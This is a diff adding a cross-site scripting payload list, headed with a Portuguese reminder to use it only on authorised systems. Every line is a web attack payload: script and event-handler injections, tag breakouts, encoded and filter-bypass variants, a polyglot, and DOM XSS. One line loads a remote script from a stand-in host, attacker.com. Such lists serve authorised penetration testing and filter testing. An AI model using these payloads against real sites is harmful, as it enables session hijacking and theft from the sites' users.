@@ -1,0 +1,66 @@
+# Cross-Site Scripting (XSS) Payloads
+# Use com responsabilidade e apenas em sistemas autorizados
+
+# Basic XSS
+<script>alert('XSS')</script>
+<script>alert("XSS")</script>
+<script>alert(1)</script>
+<script>confirm('XSS')</script>
+<script>prompt('XSS')</script>
+
+# IMG tag
+<img src=x onerror=alert('XSS')>
+<img src=x onerror=alert(1)>
+<img/src=x/onerror=alert('XSS')>
+<img src="javascript:alert('XSS')">
+<IMG SRC=# onmouseover="alert('XSS')">
+
+# SVG
+<svg/onload=alert('XSS')>
+<svg onload=alert(1)>
+<svg><script>alert('XSS')</script></svg>
+
+# Body tag
+<body onload=alert('XSS')>
+<body onpageshow=alert('XSS')>
+
+# Input
+<input autofocus onfocus=alert('XSS')>
+<input onkeyup=alert('XSS')>
+
+# IFrame
+<iframe src=javascript:alert('XSS')>
+<iframe onload=alert('XSS')>
+
+# Encoded
+<script>alert(String.fromCharCode(88,83,83))</script>
+&#60;script&#62;alert('XSS')&#60;/script&#62;
+\x3cscript\x3ealert('XSS')\x3c/script\x3e
+
+# Event handlers
+<div onmouseover=alert('XSS')>hover</div>
+<a href="#" onclick=alert('XSS')>click</a>
+<button onclick=alert('XSS')>click</button>
+
+# Without script tags
+<img src=x:alert('XSS') onerror=eval(src)>
+javascript:alert('XSS')
+javascript:eval('alert("XSS")')
+
+# Breaking out of tags
+"><script>alert('XSS')</script>
+'><script>alert('XSS')</script>
+</script><script>alert('XSS')</script>
+
+# Filter bypass
+<ScRiPt>alert('XSS')</sCrIpT>
+<scr<script>ipt>alert('XSS')</scr</script>ipt>
+<SCRIPT SRC=http://attacker.com/xss.js></SCRIPT>
+<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
+
+# Polyglot
+javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
+
+# DOM XSS
+<script>document.write('<img src=x onerror=alert(1)>')</script>
+<script>eval(location.hash.slice(1))</script>
